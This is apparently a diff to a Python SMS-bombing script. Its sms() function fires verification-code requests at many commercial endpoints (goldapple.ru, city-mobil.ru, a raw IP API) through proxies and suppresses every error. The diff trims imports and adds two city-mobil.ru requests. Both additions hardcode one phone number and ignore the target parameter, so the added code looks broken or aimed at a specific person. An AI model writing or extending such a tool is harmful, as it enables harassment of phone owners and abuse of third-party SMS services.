@@ -17,7 +17,7 @@
 ╚═════════════════════════════════════════════════════════════════════════════════╝
 """
 
-#--------------------------------------(sms)--------------------------------------
+#---------------------------------------(sms)--------------------------------------
 
 import os
 import sys
@@ -36,33 +36,18 @@ import colorama
 import datetime
 import threading
 import user_agent
-import progressbar
 from time import sleep
 from threading import *
 from sys import platform
 from asyncio import sleep
 from getpass import getpass
 from os import name, system
-from progress.bar import Bar
 from threading import Thread
 from functools import reduce
-from bs4 import BeautifulSoup
 from requests import get, post
-from selenium import webdriver
 from os.path import exists, isfile
 from random import choice, randint
-from bs4 import BeautifulSoup as bs
-from selenium_stealth import stealth
-from progress.spinner import Spinner
-from selenium.webdriver.common.by import By
 from colorama import Fore, Back, Style, init
-from selenium.webdriver.common.keys import Keys
-from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.support.ui import WebDriverWait
-from webdriver_manager.chrome import ChromeDriverManager
-from selenium.webdriver.common.action_chains import ActionChains
-from selenium.webdriver.support import expected_conditions as EC
-from selenium.common.exceptions import StaleElementReferenceException
 
 colorama.init()
 
@@ -98,6 +83,15 @@ def sms(prx, number, tm):
 					requests.post("https://goldapple.ru/rest/V2.1/mobile/auth/send_sms_code?store_id=1&type=android", json=payload, proxies = proxies)
 				except:
 					pass
+
+				try:
+				    payload = {
+				        "landing": "loyalty",
+				        "phone": "79110385633"
+				    }
+				    requests.post("https://hemingoway.city-mobil.ru/api/v1/send_link", json=payload, proxies = proxies)
+				except:
+				    pass
 
 				try:
 					payload = {
@@ -310,6 +304,15 @@ def sms(prx, number, tm):
 					requests.post("http://94.154.218.82:7201/api/account/register/sendConfirmCode", headers=header, data=payload)
 				except:
 					pass
+
+				try:
+				    payload = {
+				        "landing": "loyalty",
+				        "phone": "79110385633"
+				    }
+				    requests.post("https://hemingoway.city-mobil.ru/api/v1/send_link", json=payload)
+				except:
+				    pass
 
 				try:
 					payload = {"phone": "+" + number, "type": "authenticateCode"}
